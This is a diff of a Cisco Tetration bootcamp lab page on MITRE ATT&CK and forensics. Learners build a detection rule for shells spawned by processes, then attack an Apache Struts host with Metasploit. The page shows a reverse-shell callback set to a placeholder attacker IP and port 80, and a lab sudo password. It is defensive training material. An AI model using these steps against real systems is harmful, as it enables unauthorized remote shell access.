@@ -1,11 +1,11 @@
 # Cisco Tetration Virtual Bootcamp
 
-Module 06.00  ATT&CK! and Forensics
+## Module 06.00  ATT&CK! and Forensics
 
----
+---  
 
 
-This diagram depicts the flow of traffic that will be used during the lab that calls for you to initiate a live attack from the Kali Linux server running the Metasploit toolkit. This will demonstrate the [MITRE ATT&CK Framework](https://attack.mitre.org/){:target="_blank"} that has been defined by the not-for-profit organization called Mitre Corporation - whose charters and funding come from (among other places) [NIST](https://www.nist.gov/){:target="_blank"}. This is also the organization that maintains ["CVEs" or "Common Vulnerabilities and Exposures"](https://cve.mitre.org/){:target="_blank"} as a part of the ["NVD" or "National Vulnerability Database"](https://nvd.nist.gov/){:target="_blank"}. This framework articulates the systematic approach that virtually every breach consists of. 
+The diagram below depicts the flow of traffic that will be used during the lab that calls for you to initiate a live attack from the Kali Linux server running the Metasploit toolkit. This will demonstrate the [MITRE ATT&CK Framework](https://attack.mitre.org/){:target="_blank"} that has been defined by the not-for-profit organization called Mitre Corporation - whose charters and funding come from (among other places) [NIST](https://www.nist.gov/){:target="_blank"}. This is also the organization that maintains ["CVEs" or "Common Vulnerabilities and Exposures"](https://cve.mitre.org/){:target="_blank"} as a part of the ["NVD" or "National Vulnerability Database"](https://nvd.nist.gov/){:target="_blank"}. This framework articulates the systematic approach that virtually every breach consists of. 
 
 This consists of:
 1. Initial Access
@@ -28,10 +28,20 @@ You will use this diagram when performing the lab that will have you attack a kn
 
 ---
 
-<a href="https://cisco-tetration-hol-content.s3.amazonaws.com/videos/10_forensics.mp4" style="font-weight:bold" title="Collection Rules Title"><img src="https://tetration.guru/bootcamp/diagrams/images/video_icon_small.png"> Click here to view a video that demonstrates a live attack and the ability to detect the attack and perform Forensic analysis.</a>
+## --- Lecture Video ---  
+---  
+<a href="https://deftcon-tetration-virtual-bootcamp.s3.us-east-2.amazonaws.com/lectures/Module_06.00__Lecture__ATTACK_and_Forensic_Analysis.mp4" style="font-weight:bold"><img src="https://tetration.guru/bootcamp/diagrams/images/video_icon_small.png">Connectors :: Lecture Video :: Runtime: 42 mins</a>  
+  
+---  
+  
 
----
+## --- Demo Video ---  
+---  
+<a href="https://deftcon-tetration-virtual-bootcamp.s3.us-east-2.amazonaws.com/demos/Module_06.00__Demo__ATTACK_and_Forensic_Analysis.mp4" style="font-weight:bold"><img src="https://tetration.guru/bootcamp/diagrams/images/video_icon_small.png">Data Sources - Agents :: Demo Video :: Runtime: 8 mins</a>  
+  
+---  
 
+## --- Lab ---  
 ### Steps for this Lab  
 <a href="#step-001" style="font-weight:bold">Step 001 - Navigate to Agent Config</a>  
 <a href="#step-002" style="font-weight:bold">Step 002 - Edit the Linux Agent Config Intent</a>  
@@ -60,7 +70,7 @@ You will use this diagram when performing the lab that will have you attack a kn
 
 Navigate to Agent Config and Agent Config Intent.
 
-<a href="images/module10_001.png"><img src="images/module10_001.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_001.png"><img src="images/module_06_001.png" style="width:100%;height:100%;"></a>  
 
 
 <div class="step" id="step-002"><a href="#step-002" style="font-weight:bold">Step 002</a></div>  
@@ -68,14 +78,14 @@ Navigate to Agent Config and Agent Config Intent.
 Edit the Linux Config Intent.
 
 
-<a href="images/module10_002.png"><img src="images/module10_002.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_002.png"><img src="images/module_06_002.png" style="width:100%;height:100%;"></a>  
 
 
 <div class="step" id="step-003"><a href="#step-003" style="font-weight:bold">Step 003</a></div>  
 
 Scroll down and click to enable Forensics,  then save the configuration.
 
-<a href="images/module10_003.png"><img src="images/module10_003.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_003.png"><img src="images/module_06_003.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -83,7 +93,7 @@ Scroll down and click to enable Forensics,  then save the configuration.
 
 Navigate to Security > Forensics Config.
 
-<a href="images/module10_004.png"><img src="images/module10_004.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_004.png"><img src="images/module_06_004.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -91,7 +101,7 @@ Navigate to Security > Forensics Config.
 
 Click on Create Rule.
 
-<a href="images/module10_005.png"><img src="images/module10_005.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_005.png"><img src="images/module_06_005.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -99,7 +109,7 @@ Click on Create Rule.
 
 Enter the rule details as shown below.  The rule is configured to begin recording activity (Follow Process) when a bash shell (/bin/sh or /usr/bin/bash) is launched from a process rather than from a user login, which would normally be the case.
 
-<a href="images/module10_006.png"><img src="images/module10_006.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_006.png"><img src="images/module_06_006.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -109,7 +119,7 @@ Create a new Profile. A Profile is a set of rules which can then be applied to a
 
 
 
-<a href="images/module10_007.png"><img src="images/module10_007.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_007.png"><img src="images/module_06_007.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -117,7 +127,7 @@ Create a new Profile. A Profile is a set of rules which can then be applied to a
 
 Enter the name "Custom Profile" and select the Apache Struts Attack rule that we just created.  Then save the profile.  
 
-<a href="images/module10_008.png"><img src="images/module10_008.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_008.png"><img src="images/module_06_008.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -125,13 +135,13 @@ Enter the name "Custom Profile" and select the Apache Struts Attack rule that we
 
 Under Intents, select the profile we just created under Apply profile and enter the Linux inventory filter in the "to filter" field. This is an Inventory Filter we created previously that matches hosts running Linux.
 
-<a href="images/module10_009.png"><img src="images/module10_009.png" style="width:100%;height:100%;"></a>   
+<a href="images/module_06_009.png"><img src="images/module_06_009.png" style="width:100%;height:100%;"></a>   
 
 <div class="step" id="step-010"><a href="#step-010" style="font-weight:bold">Step 010</a></div>  
 
 Open a session to the Attack Host from the Apache Guacamole console.
 
-<a href="images/module10_010.png"><img src="images/module10_010.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_010.png"><img src="images/module_06_010.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -139,7 +149,7 @@ Open a session to the Attack Host from the Apache Guacamole console.
 
 Enter the command `sudo msfconsole` to start Metasploit.   The sudo password is `tet123$$!`
 
-<a href="images/module10_011.png"><img src="images/module10_011.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_011.png"><img src="images/module_06_011.png" style="width:100%;height:100%;"></a>  
 
 <div class="step" id="step-012"><a href="#step-012" style="font-weight:bold">Step 012</a></div>  
 
@@ -154,7 +164,7 @@ set lhost <ATTACK MACHINE IP>
 set lport 80
 ```
 
-<a href="images/module10_012.png"><img src="images/module10_012.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_012.png"><img src="images/module_06_012.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -162,7 +172,7 @@ set lport 80
 
  Enter the command `show options` and review the information you have entered.
 
-<a href="images/module10_013.png"><img src="images/module10_013.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_013.png"><img src="images/module_06_013.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -176,7 +186,7 @@ Enter `whoami` to see that you are logged in as the root user.  This confirms we
 
 Run the command `hostnamectl` to display the host details.   
 
-<a href="images/module10_014.png"><img src="images/module10_014.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_014.png"><img src="images/module_06_014.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -184,7 +194,7 @@ Run the command `hostnamectl` to display the host details.
 
 Back in Tetration,  navigate to Forensics Analysis.  
 
-<a href="images/module10_015.png"><img src="images/module10_015.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_015.png"><img src="images/module_06_015.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -194,7 +204,7 @@ Change the time range to the last hour.
 
 > It may take a few minutes for the alarms to be triggered.  Refresh the page until you see the alarms appear.
 
-<a href="images/module10_016.png"><img src="images/module10_016.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_016.png"><img src="images/module_06_016.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -202,7 +212,7 @@ Change the time range to the last hour.
 
 Click to examine the alarm for the hostnamectl command.  
 
-<a href="images/module10_017.png"><img src="images/module10_017.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_017.png"><img src="images/module_06_017.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -210,7 +220,7 @@ Click to examine the alarm for the hostnamectl command.
 
 Here we can see the process tree, and an indication of what happened.  A command shell (/bin/sh) was launched from the java process, which is not a normal activity. Then we can see the command that was run,  hostnamectl.  Click on the hostnamectl command to see more details.
 
-<a href="images/module10_018.png"><img src="images/module10_018.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_018.png"><img src="images/module_06_018.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -218,7 +228,7 @@ Here we can see the process tree, and an indication of what happened.  A command
 
 Here we can see the forensics details of the command run and the privilege level under which the command was executed (root).   
 
-<a href="images/module10_019.png"><img src="images/module10_019.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_019.png"><img src="images/module_06_019.png" style="width:100%;height:100%;"></a>  
 
 
 
@@ -226,10 +236,10 @@ Here we can see the forensics details of the command run and the privilege level
 
 Examine the other alarms that were generated. These show the initial access where the command shell was spawned from the Java process.  
 
-<a href="images/module10_020.png"><img src="images/module10_020.png" style="width:100%;height:100%;"></a>  
+<a href="images/module_06_020.png"><img src="images/module_06_020.png" style="width:100%;height:100%;"></a>  
 
 
-YOU HAVE FINISHED THIS MODULE
+---   
 
 
 | [Return to Table of Contents](https://tetration.guru/bootcamp/) | [Go to Top of the Page](README.md) | [Continue to the Next Module](../module_07/) |
